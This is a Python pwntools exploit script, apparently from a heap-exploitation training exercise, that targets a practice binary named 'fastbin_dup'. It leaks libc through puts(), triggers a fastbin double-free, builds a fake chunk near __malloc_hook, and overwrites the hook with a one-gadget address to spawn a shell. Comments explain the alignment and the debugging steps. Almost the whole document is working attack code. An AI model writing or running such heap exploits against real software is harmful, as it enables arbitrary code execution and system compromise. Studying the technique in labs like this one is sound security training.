#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again
context.terminal = ['qterminal', '-e', '/usr/bin/python3']

gs = '''
init-pwndbg
'''
# continue


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0


# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
# This is to avoid memory corrupton issues. The 0x31 is there to provide a size field for the new heap we have allocated in the end
username = p64(0) + p64(0x31)
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x68-sized chunks and fill them with data.
# It's 0x68 and not 0x28 because we want the 0x70 fastbin list to work with
# our fake chunk with the size 0x7f. We adjust sizes according to the fake chunks essentially.
chunk_A = malloc(0x68, b"A" * 0x28)
chunk_B = malloc(0x68, b"B" * 0x28)

# Free the first chunk, then the second.
# This causes a double-free situation without malloc throwing errors.
# The error happens when the top of the fastbins linked list being freed is the same as the last chunk freed.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Here we are going to allocate the address of free_hook to a chunk that will be linked to chunk A
# The -16 is to neatly align the allocation of the free_hook address. Nothing else
# This doesn't work though. The fastbin size field check fails.
# malloc(0x28, p64(libc.sym.__free_hook - 16))
"""
Note: Convert hex to their integer counterparts to get a better idea of aligments
Thus, we try to find fake chunks using find_fake_fast &__malloc_hook
whatever the difference is from _malloc_hook, subtract that from the address of _malloc_hook to get your fake_chunk
- dump malloc_hook's address by dq __malloc_hook. Take the first address here.
- run the find_fake_fast on malloc_hook and get the address of the chunk. Subtract both and get the absolute value
- if absolute value is x, the chunk is at address __malloc_hook-x
- Take note of the size of the fake chunk you are using. In this case it's 0x7f
- Therefore, allocate subsequent chunks of size 0x68 atleast
"""
malloc(0x68, p64(libc.sym.__malloc_hook-35))
# We allocate two chunks to span the space of the two allocations of A and B
malloc(0x68, "X")
malloc(0x68, "X")

# This 19 is for neat alignment. Check dq __malloc_hook to see what's going on
# We can check the funcion code malloc_hook has now by doing u __malloc_hook
# Note: Here we are no longer calling system but instead are calling one-gadget
# commmand used - one_gadget $(ldd fastbin_dup | grep libc.so.6 | cut -d " " -f 3)
# The gadget needed rsp+0x50 to be null but it isn't. But rsp+0x58 was null and that works
# DONT TAKE ONE_GADGET OUTPUT AS GOSPEL. Things can work out.
# Do break at malloc_hook to see the register/stack values to see if something would work or not
malloc(0x68, b"A" * 19 +p64(libc.address+0xe1fa1))

# Now call malloc to again to call the malloc hook and thus executing our one-gadget.
# malloc(1,b"")
# =============================================================================

io.interactive()
